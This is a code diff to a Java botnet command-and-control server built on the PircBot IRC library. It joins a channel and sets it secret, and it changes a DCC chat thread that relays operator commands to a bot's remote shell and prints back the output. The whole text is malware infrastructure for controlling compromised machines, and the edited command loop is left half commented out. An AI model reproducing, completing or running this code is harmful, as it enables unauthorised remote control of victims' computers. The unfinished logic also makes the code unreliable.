@@ -26,7 +26,7 @@ public class BotnetServer extends PircBot {
 			setName(NAME);
 			setMessageDelay(0);
 			
-			startIdentServer();
+			//startIdentServer();
 			connect(SERVER, PORT);
 			
 			setMode(CHANNEL, "s");
@@ -110,27 +110,37 @@ public class BotnetServer extends PircBot {
 	}
 	
 	private class ChatThread extends Thread {
+		private static final String SENTINEL = ":::END:::";
 		DccChat chat;
+		
 		public ChatThread(DccChat chat) {
 			this.chat = chat;
-			if (chat != null) this.start();
+			if (chat != null) {
+				this.start();
+			} else {
+				System.out.println("The chat request was rejected.");
+			}
 		}
+		
 		public void run() {
 			Scanner input = new Scanner(System.in);
-			Scanner shellin = new Scanner(chat.getBufferedReader());
+			
+			Scanner shellout = new Scanner(chat.getBufferedReader());
 			try {
-				System.out.print(shellin.nextLine());
+				System.out.print("$: ");
+				System.out.print(shellout.nextLine());
+				
 				String command = input.nextLine();
-				while (!command.equalsIgnoreCase("quit shell")) {
+				//while (!command.equalsIgnoreCase("quit shell")) {
 					chat.sendLine(command);
 					String response = "";
-					while (shellin.hasNextLine()) {
-						response += shellin.nextLine() + "\n";
-					}
-					System.out.println(response);
-					response = input.nextLine();
-				}
-				chat.sendLine(command);
+					//while (!response.equals("$: ")) {
+						response = shellout.nextLine();
+						System.out.println(response);
+					//}
+					//command = input.nextLine();
+				//}
+				//chat.sendLine(command);
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
